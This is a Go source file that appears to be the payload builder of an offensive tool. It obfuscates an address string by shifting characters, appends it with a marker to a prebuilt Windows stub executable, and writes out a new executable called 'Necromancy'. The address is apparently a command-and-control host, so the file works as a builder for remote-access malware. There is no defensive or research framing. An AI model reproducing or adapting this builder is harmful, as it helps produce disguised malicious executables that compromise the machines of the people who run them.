package main

import (
	"io/ioutil"
	"log"

	//"os"
	"strings"

	"github.com/whiterabb17/greatwhite/modules/util"
)

var spell = "8894f4ba656547fd0d80507772c49bb2fe31f26aa7279097049b8dd5e073fbd8855b41c55e26a6fd0eee531ebdeb3ecbeb47c010914993c9c161afe64c043b62"

func returnExt(choice string) string {
	if choice == "windows" {
		log.Println("Using Production Windows Stub")
		return ".exe"
	} else if choice == "winD" {
		log.Println("Using Development Windows Stub")
		return "D.exe"
	}
	return ""
}

func obfuscate(Data string) string {
	var ObfuscateText string
	for i := 0; i < len(Data); i++ {
		ObfuscateText += string(int(Data[i]) + 1)
	}
	return ObfuscateText
}

func buildGo(addr, os /*, pers, evde*/ string) error {
	input := []byte(obfuscate(addr /* + "><" + pers + "><" + evde*/))
	stub, err := ioutil.ReadFile(os)
	if err != nil || len(stub) == 0 {
		log.Println(err)
		return err
	}
	ext := strings.Split(os, ".")[1]
	data := append(stub, append([]byte(util.Soul), input...)...)

	err = ioutil.WriteFile("./Necromancy."+ext, data, 0755)
	if err != nil {
		log.Println(err)
		return err
	}
	log.Println("Finished!")
	return nil
}
